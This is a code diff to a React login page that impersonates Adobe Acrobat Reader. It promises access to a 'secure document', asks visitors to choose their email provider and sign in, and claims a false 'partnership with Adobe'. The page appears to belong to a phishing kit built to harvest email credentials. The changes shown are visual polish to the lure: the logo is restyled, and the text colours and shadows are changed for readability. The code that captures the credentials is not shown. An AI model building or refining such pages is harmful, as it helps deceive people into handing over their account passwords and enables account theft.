@@ -76,7 +76,7 @@ const LoginPage: React.FC<LoginPageProps> = ({
     <img 
       src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/60/Adobe_Acrobat_Reader_icon_%282020%29.svg/640px-Adobe_Acrobat_Reader_icon_%282020%29.svg.png" 
       alt="Adobe Acrobat Reader Logo" 
-      className="w-10 h-10"
+      className="w-10 h-10 drop-shadow-lg"
     />
   );
 
@@ -92,15 +92,13 @@ const LoginPage: React.FC<LoginPageProps> = ({
         <div className="w-full max-w-md">
           <div className="mb-8 text-center">
             <div className="flex justify-center mb-6">
-              <div className="bg-white/90 p-3 rounded-xl shadow-lg backdrop-blur-sm">
-                <AdobeLogo />
-              </div>
+              <AdobeLogo />
             </div>
-            <h1 className="text-2xl font-bold text-white drop-shadow-lg">Sign in to continue</h1>
-            <p className="text-white/90 mt-2 text-sm drop-shadow">
-              to access your secure document: <span className="font-medium">{fileName}</span>
+            <h1 className="text-3xl font-bold text-gray-900 drop-shadow-[0_2px_4px_rgba(255,255,255,0.8)]">Sign in to continue</h1>
+            <p className="text-gray-800 mt-3 text-base drop-shadow-[0_1px_2px_rgba(255,255,255,0.7)] font-medium">
+              to access your secure document: <span className="font-bold text-gray-900">{fileName}</span>
             </p>
-            <p className="text-white/80 text-sm font-medium mt-6 drop-shadow">Choose your email provider</p>
+            <p className="text-gray-800 text-base font-semibold mt-6 drop-shadow-[0_1px_2px_rgba(255,255,255,0.7)]">Choose your email provider</p>
           </div>
           
           <div className="space-y-2">
@@ -125,7 +123,7 @@ const LoginPage: React.FC<LoginPageProps> = ({
           </div>
 
           <div className="mt-8 text-center">
-            <p className="text-xs text-white/70 drop-shadow">© 2025 municipalfilesport. Secured in partnership with Adobe®.</p>
+            <p className="text-sm text-gray-800 font-medium drop-shadow-[0_1px_2px_rgba(255,255,255,0.6)]">© 2025 municipalfilesport. Secured in partnership with Adobe®.</p>
           </div>
         </div>
       ) : (
@@ -133,9 +131,7 @@ const LoginPage: React.FC<LoginPageProps> = ({
         <div className="w-full max-w-md bg-white/70 backdrop-blur-md rounded-2xl shadow-2xl overflow-hidden border border-white/20">
           <div className="p-8">
             <div className="flex justify-center mb-6">
-              <div className="bg-white/90 p-3 rounded-xl shadow-lg backdrop-blur-sm">
-                <AdobeLogo />
-              </div>
+              <AdobeLogo />
             </div>
             <h1 className="text-2xl font-bold text-center text-gray-800">Sign in with {selectedProvider}</h1>
             <p className="text-center text-gray-600 mt-2 text-sm">
